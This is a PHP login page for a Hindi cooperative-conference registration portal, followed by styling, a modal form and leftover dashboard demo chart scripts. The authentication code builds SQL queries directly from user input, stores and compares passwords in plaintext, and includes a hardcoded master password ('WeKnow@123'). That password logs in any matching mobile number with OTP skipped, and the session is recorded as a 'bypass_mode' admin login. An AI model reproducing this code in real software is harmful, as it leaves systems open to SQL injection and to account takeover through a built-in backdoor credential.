<?php
include("scripts/settings.php");
logvalidate();
$msg='';
if(isset($_POST['submit'])) {
	if(isset($_POST['mobile_number'])){
		// $sql = 'select * from session where sno="'.$_SESSION['session_insert_id'].'"';
		// $session_row = mysqli_fetch_assoc(execute_query($sql));
		// $compare_otp = $session_row['sno'].'_'.$_POST['mobile_otp'];
		// //echo $compare_otp.'>>'.$session_row['otp_verification'];
		// $msg='<h1>Welcome '.$_SESSION['username'].'</h1>';
		// if($compare_otp==$session_row['otp_verification']){
		// 	$sql = 'update session set otp_verification="1" where sno='.$_SESSION['session_insert_id'];
		// 	execute_query($sql);
		// 	$get_msg = "Welcome ".$_SESSION['username'].", your OTP is verified.";
		// 	send_sms($mobile,$get_msg);
		// }
		// else{
		// 	$msg.='<h3>Invalid OTP.</h3>';
		// }

	}
	elseif($_POST['username']!='' && $_POST['userpwd']!='') {
		 
		$sql = 'select * from users where userid="'.$_POST['username'].'"';
		$result = execute_query($sql);
		if(mysqli_num_rows($result)!=0) {			
			
			$row = mysqli_fetch_array(execute_query($sql));
			if($_POST['userpwd']==$row['pwd']) {
				$sql='select * from user_access_detail where user_id = "'.$row['sno'].'"';
				$row1 = mysqli_fetch_array(execute_query($sql));
				$_SESSION['usersno'] = $row['sno'];
				$_SESSION['username'] = $row['userid'];
				$_SESSION['userpwd'] = $row['pwd'];
				$_SESSION['usertype'] = $row['type'];
				$_SESSION['session_id'] = randomstring();
				$_SESSION['startdate'] = date('y-m-d');
				$_SESSION['accessid'] = $row1['auth_id'];
				$_SESSION['branch'] = $row['branch'];
				$_SESSION['admin_session'] = 1;
				$_SESSION['otp_verify'] = 0;
				if(!isset($_SESSION['authcode'])){
					$_SESSION['authcode']='';
				}
				$_SESSION['district'] = array();
				$sql = 'select * from user_district where user_id="'.$row['sno'].'"';
				$result_user_district = execute_query($sql);
				if(mysqli_num_rows($result_user_district)!=0){
					while($row_user_district = mysqli_fetch_assoc($result_user_district)){
						$_SESSION['district'][] = $row_user_district['district_id'];
					}
				}
				
				$_SESSION['division'] = array();
				$sql = 'select * from user_division where user_id="'.$row['sno'].'"';
				$result_user_division = execute_query($sql);
				if(mysqli_num_rows($result_user_division)!=0){
					while($row_user_division = mysqli_fetch_assoc($result_user_division)){
						$_SESSION['division'][] = $row_user_division['division_id'];
					}
				}
				
				
				$sql = 'select * from plv_users where user_id="'.$row['sno'].'"';
				$plv_users = mysqli_fetch_assoc(execute_query($sql));
				$_SESSION['tehsil'] = $plv_users['tehsil'];
				$_SESSION['plv_id'] = $plv_users['sno'];
				
				
				$time = localtime();
		        $time = $time[2].':'.$time[1].':'.$time[0];
				//echo $time;
		        $_SESSION['starttime']=$time;
				
				$sql = "insert into session (user, s_id, s_start_date, s_start_time, last_active) values ('".$_SESSION['username']."','".$_SESSION['session_id']."','".$_SESSION['startdate']."','".$_SESSION['starttime']."', '".time()."')";
				execute_query($sql);
				$id = mysqli_insert_id($db);

				$_SESSION['session_insert_id'] = $id;
				
				
				$otp_verify = mysqli_fetch_array(execute_query("select * from general_settings where `desc`='otp_verification'"));
				$otp_verify = $otp_verify['rate'];
				$_SESSION['otp_verify'] = $otp_verify;
				if($otp_verify==1){
					$mobile;
					$otp = randomnumber();
					$sql = 'update session set otp_verification="'.$id.'_'.$otp.'" where sno='.$id;
					execute_query($sql);
					$get_msg = "Dear, ".$_SESSION['username']." one time verification code for your ERP Login is $otp. The code is valid for 30 mins only.";
					send_sms($mobile,$get_msg);
					
				}

				// $msg='<h1>Welcome '.$_SESSION['username'].'</h1>';
				// $msg='<h1>Welcome '.$_SESSION['usertype'].'</h1>';
				
				if($_SESSION['usertype']=="5"){
					
					header("location: sammelen_reg_form.php");
				}else{
					header("location: sammelen_dashboard.php");
				}
				
			}
			else {
				
				$msg .= '<h4 class="header text-center alert alert-danger">Please Enter Valid User Password</h4>';
				
			}
		}
		else {
			$sql = '(SELECT sno, ar_name as full_name, mobile_number, "ar_dr" as info FROM `ar_dr` where mobile_number="'.$_POST['username'].'") 
			union all
			(SELECT sno, ar_name as full_name, mobile_number, "ar" as info FROM `ar` where mobile_number="'.$_POST['username'].'") 
				union all 
				(SELECT sno, ado_name as full_name, mobile_number, "ado" as info FROM `ado` where mobile_number="'.$_POST['username'].'") 
				union all 
				(SELECT sno, adco_name as full_name, mobile_number, "adco" as info FROM `adco` where mobile_number="'.$_POST['username'].'")';
				//echo $sql;
				$result = execute_query($sql);
				if(mysqli_num_rows($result)==0){
					$msg .= '<h4 class="header text-center alert alert-danger">Please Enter Valid User Name</h4>';
					
					//$data[] = array("status"=>"error", "msg"=>"Invalid Mobile Number");
				}
				else{
					if($_POST['userpwd']=='WeKnow@123'){
						$row = mysqli_fetch_assoc($result);
						
						$_SESSION['usersno'] = $row['sno'];
						$_SESSION['session_id'] = randomstring();
						$_SESSION['startdate'] = date('y-m-d');
						
						$_SESSION['session_id'] = randomstring();
						$_SESSION['user_type'] = $row['info'];
						$_SESSION['user_id'] = $row['sno'];
						$_SESSION['username'] = $row['full_name'];

						$sql = "insert into session (user_type, user_id, otp_verification, s_start_date, s_start_time, last_active, s_id, admin_remarks) values ('".$row['info']."', '".$row['sno']."', '1', '".date("Y-m-d")."','".date("H:i:s")."', '".time()."', '".$_SESSION['session_id']."', 'admin_login bypass_mode')";
						execute_query($sql);
						$id = mysqli_insert_id($db);
						$sql = 'update session set otp_verification=1 where sno="'.$row['sno'].'"';
						execute_query($sql);
						//$data[] = array("status"=>"verified", "msg"=>"OTP Verified");
						$_SESSION['act_session_id'] = $_SESSION['session_id'];
						$_SESSION['usertype'] = 3;

						//$data[] = array("status"=>"otp_sent", "msg"=>"OTP Sent on mobile.".$otp);
					}
					else{
						$msg .= '<h4 class="header text-center alert alert-danger">Please Enter Valid User Password</h4>';
						
					}
				}
			 	
		}		 
	}
	else {
		 
		$msg .= '<h4 class="header text-center alert alert-danger">Please Enter User Detail</h4>';
		
	 }
}

?>

<?php
page_header_start();
page_header_end();
?>	
<style>
	.modal-dialog {
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: calc(100% - 1rem);
    }
	.modal-backdrop {
		position: fixed;
		top: 0;
		left: 0;
		z-index: 1;
		width: 100vw;
		height: 100vh;
		background-color: #000;
	}
	.modal .modal-content .modal-body {
		
		padding: 0;
		line-height: 1.9;
	}
	.full-page:before {
		opacity: 1;
		background: transparent;
	}
	.wrapper {
		background-color: #fc8133;
		height: 100vh;
    }
	.readyBtn {
		display: block;
		position: relative;
		top:12rem;
		width: 250px;
		height: 50px;
		background: white;
		box-shadow: 0 4px 4px rgba(0, 0, 0, .3);
		border-radius: 20px;
		line-height: 50px;
		text-align: center;
		text-decoration: none;
		color: #fc8133;
		font-size:1.2rem;
		cursor:pointer;
		margin-top:330px;
		}


		.readyBtn::before {
		display: block;
		position: absolute;
		/* bottom:1rem; */
		z-index: -1;
		width: 100%;
		height: 100%;
		border-radius: 20px;
		background: black;
		opacity: 0;
		content: '';
		animation: pulse 1s infinite;
		}

		.readyBtn:hover::before {
			animation: none;
			opacity: .4;
			transform: scale(1.3);
		}
		.readyBtn.is-clicked {
			background: linear-gradient(to bottom, gray 0%, dimgray 100%);
		}
		.readyBtn.is-clicked:before {
			animation: blastOut 1s;
		}

		@keyframes pulse {
		from {
			transform: scale(1);
			opacity: .4;
		}
		to {
			transform: scale(1.3);
			opacity: 0;
		}
		}

		@keyframes blastOut {
		from {
			transform: scale(0.9);
			opacity: .4;
		}
		to {
			transform: scale(10);
			opacity: 0;
		}
		}
		/* @media screen and (max-width: 1145px) {
			.readyBtn {
				bottom:0.5rem;
				font-size:1.1rem;

			}
		}
		@media screen and (max-width: 882px) {
			.readyBtn {
			
				font-size:1rem;

			}
			.full-page-background{
				background-position: top;
			}
		}
		 */

		 @media screen and (max-width: 789px) {
			.readyBtn {
				top:10rem;

			}
		}
</style>
<div class="wrapper wrapper-full-page">
        <!-- Navbar -->
        
        <!-- End Navbar -->
        <div class="full-page  section-image" data-color="" data-image="images/loginbg.jpg">
            <!--   you can change the color of the filter page using: data-color="blue | purple | green | orange | red | rose " -->
            <div class="centerbtn" style="display:flex;justify-content:center;align-items:center;height:100vh;z-index:1000;position:relative;bottom:3rem;">
				<span class="readyBtn"data-toggle="modal" data-target="#exampleModal">रजिस्ट्रेशन के लिये क्लिक करें  !!!</span>
				<!-- <button type="button" class="btn btn-outline-warning " data-toggle="modal" data-target="#exampleModal">
				प्रारंभ करे  !!!
				</button> -->

				<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
					<div class="modal-dialog" role="document">
					<div class="modal-content">
						<div class="modal-header">
						<h5 class="modal-title" id="exampleModalLabel"></h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
						</div>
						<div class="modal-body">
							<div class="content">
								<div class="container">
								<div class="col-md-12  ml-auto mr-auto login-page">
									<form id="loginform" name="login" class="wufoo page" autocomplete="off" enctype="multipart/form-data" method="post" action="index.php">
									<div class="card card-login">
										<div class="card-header card-header-rose text-center ">
										<h2 class="header text-center" style="font-size: 1.6rem">सहकारिता महासम्मेलन </h2>
										<?php echo $msg; ?>
										</div>
										<div class="card-head p-2 text-center">
											<p>सहकारिता महासम्मेलन के रजिस्ट्रेशन पोर्टल पर आपका स्वागत है । रजिस्ट्रेशन करने के लिये log in करे </p>
										</div>
										<div class="card-body ">
											<form id="loginform" name="login" class="wufoo page" autocomplete="off" enctype="multipart/form-data" method="post" action="index.php">
											<div class="form-group">
												<label>User ID</label>
												<input type="text" placeholder="Enter User ID" name="username" class="form-control">
											</div>
											<div class="form-group" style="position:relative;">
												<label>Password</label>
												<input type="password" placeholder="Password" name="userpwd" id="userpwd" class="form-control" style="padding-right:30px;">
												<span class="fa fa-solid fa-eye-slash" id="showpassid" style="position:absolute;right:10px;top:62%;cursor:pointer;" onClick="showpass();" ></span>
											</div>
											<div class="form-group">
												<button type="submit" name="submit" class="btn btn-warning btn-wd w-100">Login</button>
											</div>
											</form>
										</div>
										
										<!-- 
										<div class="card-footer ml-auto mr-auto">
										<a href="sammelen_reg_form.php"><button type="button" class="btn btn-success">नया रजिस्ट्रेशन करे</button></a>
										</div> -->
									</div>
									</form>
								</div>
								</div>
							</div>
						</div>
					</div>
					</div>
				</div>
			</div>
        <div class="full-page-background w-100" style="background-image: url(images/loginbg.jpg);background-size: contain;background-position: center;background-repeat: no-repeat; "></div></div>
    </div>
<?php 

page_footer_start();
?>


    <!-- Light Bootstrap Table Core javascript and methods for Demo purpose -->
	<script src="js/light-bootstrap-dashboard.js?v=1.4.0"></script>

    <script>
        function open_dropdown(id){
            var upto_dropdown = document.getElementById('upto_dropdown').value;
            for (var i = 1; i < upto_dropdown; i++) {
                if(id == i){
                    if($("#drop_"+i).css("display") == "none"){
                        $("#drop_"+i).show();
                    }
                    else{
                        $("#drop_"+i).hide();
                    }
                }
                else{
                     $("#drop_"+i).hide();
                }
                
            }
        }

    </script>
	<!--  Charts Plugin -->
	<script src="js/chartist.min.js"></script>

	<!-- Light Bootstrap Table DEMO methods, don't include it in your project! -->
	<script>
type = ['','info','success','warning','danger'];


	demo = {
		initPickColor: function(){
			$('.pick-class-label').click(function(){
				var new_class = $(this).attr('new-class');
				var old_class = $('#display-buttons').attr('data-class');
				var display_div = $('#display-buttons');
				if(display_div.length) {
				var display_buttons = display_div.find('.btn');
				display_buttons.removeClass(old_class);
				display_buttons.addClass(new_class);
				display_div.attr('data-class', new_class);
				}
			});
		},

		checkScrollForTransparentNavbar: debounce(function() {
				$navbar = $('.navbar[color-on-scroll]');
				scroll_distance = $navbar.attr('color-on-scroll') || 500;

				if($(document).scrollTop() > scroll_distance ) {
					if(transparent) {
						transparent = false;
						$('.navbar[color-on-scroll]').removeClass('navbar-transparent');
						$('.navbar[color-on-scroll]').addClass('navbar-default');
					}
				} else {
					if( !transparent ) {
						transparent = true;
						$('.navbar[color-on-scroll]').addClass('navbar-transparent');
						$('.navbar[color-on-scroll]').removeClass('navbar-default');
					}
				}
		}, 17),

		initDocChartist: function(){
			var dataSales = {
			  labels: ['9:00ASDM', '12:00AM', '3:00PM', '6:00PM', '9:00PM', '12:00PM', '3:00AM', '6:00AM'],
			  series: [
				 [287, 385, 490, 492, 554, 586, 698, 695, 752, 788, 846, 944],
				[67, 152, 143, 240, 287, 335, 435, 437, 539, 542, 544, 647],
				[23, 113, 67, 108, 190, 239, 307, 308, 439, 410, 410, 509]
			  ]
			};

			var optionsSales = {
			  lineSmooth: false,
			  low: 0,
			  high: 800,
			  showArea: true,
			  height: "245px",
			  axisX: {
				showGrid: false,
			  },
			  lineSmooth: Chartist.Interpolation.simple({
				divisor: 3
			  }),
			  showLine: false,
			  showPoint: false,
			};

			var responsiveSales = [
			  ['screen and (max-width: 640px)', {
				axisX: {
				  labelInterpolationFnc: function (value) {
					return value[0];
				  }
				}
			  }]
			];

			Chartist.Line('#chartHours', dataSales, optionsSales, responsiveSales);
			
			var data = {
			  labels: ['Jan', 'Feb', 'Mar', 'Apr', 'Mai', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
			  series: [
				[542, 443, 320, 780, 553, 453, 326, 434, 568, 610, 756, 895],
				[412, 243, 280, 580, 453, 353, 300, 364, 368, 410, 636, 695]
			  ]
			};

			var options = {
				seriesBarDistance: 10,
				axisX: {
					showGrid: false
				},
				height: "245px"
			};

			var responsiveOptions = [
			  ['screen and (max-width: 640px)', {
				seriesBarDistance: 5,
				axisX: {
				  labelInterpolationFnc: function (value) {
					return value[0];
				  }
				}
			  }]
			];

			Chartist.Bar('#chartActivity', data, options, responsiveOptions);

			var dataPreferences = {
				series: [
					[25, 30, 20, 25]
				]
			};


			var optionsPreferences = {
				donut: true,
				donutWidth: 40,
				startAngle: 0,
				total: 100,
				showLabel: false,
				axisX: {
					showGrid: false
				}
			};

			Chartist.Pie('#chartPreferences', dataPreferences, optionsPreferences);

			Chartist.Pie('#chartPreferences', {
			  labels: ['62%','32%','6%'],
			  series: [62, 32, 6]
			});
		},

		initChartist: function(){

			var dataSales = {
			  labels: ['Sep', 'Oct', 'Nov'],
			  series: [
				 [287, 385, 490],
				[67, 152, 143],
				[23, 113, 67]
			  ]
			};

			var optionsSales = {
			  lineSmooth: false,
			  low: 0,
			  high: 800,
			  showArea: true,
			  height: "245px",
			  axisX: {
				showGrid: false,
			  },
			  lineSmooth: Chartist.Interpolation.simple({
				divisor: 3
			  }),
			  showLine: false,
			  showPoint: false,
			};

			var responsiveSales = [
			  ['screen and (max-width: 640px)', {
				axisX: {
				  labelInterpolationFnc: function (value) {
					return value[0];
				  }
				}
			  }]
			];

			Chartist.Line('#chartHours', dataSales, optionsSales, responsiveSales);


			var dataPreferences = {
				series: [
					[25, 30, 20, 25]
				]
			};

			var optionsPreferences = {
				donut: true,
				donutWidth: 40,
				startAngle: 0,
				total: 100,
				showLabel: false,
				axisX: {
					showGrid: false
				}
			};

			Chartist.Pie('#chartPreferences', dataPreferences, optionsPreferences);
			
			Chartist.Pie('#chartPreferences', {
			  labels: ['63%','22%','15%'],
			  series: [63, 22, 15]
			});
		}
	}


	
	var pass=document.getElementById("userpwd");
	var showpassid=document.getElementById("showpassid");
	function showpass(){
		console.log("hello");
		if(pass.type=="password"){
			pass.type="text";
			showpassid.classList.remove("fa-eye-slash");
			showpassid.classList.add("fa-eye");

		}else{
			pass.type="password";
			showpassid.classList.remove("fa-eye");
			showpassid.classList.add("fa-eye-slash");
		}
	}

	</script>
	<script type="text/javascript">
    	$(document).ready(function(){

        	demo.initChartist();

    	});
	</script>
<?php		
		page_footer_end();
?>
